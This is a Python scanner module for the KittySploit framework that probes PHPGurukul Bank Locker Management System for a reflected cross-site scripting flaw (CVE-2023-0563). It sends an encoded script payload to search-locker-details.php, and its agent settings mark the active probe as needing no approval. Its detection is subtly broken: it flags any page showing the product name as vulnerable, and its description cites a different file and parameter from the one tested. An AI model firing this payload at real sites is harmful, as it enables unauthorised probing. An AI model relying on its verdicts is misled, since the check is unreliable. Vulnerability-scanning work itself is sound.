#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability classified as problematic has been found in PHPGurukul Bank Locker Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Bank Locker Management System - Cross-Site Scripting Detection',
        'description': 'A vulnerability classified as problematic has been found in PHPGurukul Bank Locker Management System 1.0. This affects an unknown part of the file add-locker-form.php of the component Assign Locker. The manipulation of the argument ahname leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'blms', 'xss', 'phpgurukul', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://vuldb.com/?ctiid.219717',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-0563',
            'https://vuldb.com/?id.219717',
            'https://github.com/ctflearner/ctflearner',
        ],
        'cve': 'CVE-2023-0563',
    }

    def run(self):
        path = '/search-locker-details.php'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='searchinput=%E2%80%9C%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/><script>alert(document.domain)</script>', 'Bank Locker Management System',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Bank Locker Management System - Cross-Site Scripting detected', path=path)
            return True
        return False

